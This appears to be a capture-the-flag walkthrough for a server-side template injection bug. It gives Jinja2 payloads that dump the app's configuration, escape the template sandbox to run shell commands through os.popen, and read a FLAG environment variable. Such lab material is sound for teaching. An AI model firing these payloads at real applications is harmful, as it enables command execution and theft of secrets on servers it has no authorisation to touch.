## 🔍 Walkthrough

1. **Discovering the Bug**  
   - Start by interacting with the web application and identifying input fields or endpoints that accept user input.  
   - Test for SSTI by injecting simple payloads like `{{7*7}}` into the input fields.  
   - If the application evaluates the payload and returns `49`, it confirms the presence of an SSTI vulnerability.

2. **Exploiting the Vulnerability**  
   - Once SSTI is confirmed, escalate the payload to access Python objects. For example:  
     ```
     {{config.items()}}
     ```
     This can reveal sensitive configuration details.  
   - Use the payload to access the `os` module and execute system commands. For example:  
     ```
     {{self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('whoami').read()}}
     ```
     This will execute the `whoami` command on the server.

3. **Retrieving the Flag**  
   - To retrieve the flag stored in the environment variable `FLAG`, use the following payload:  
     ```
     {{self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('echo $FLAG').read()}}
     ```
   - Submit this payload, and the application should return the value of the `FLAG` environment variable.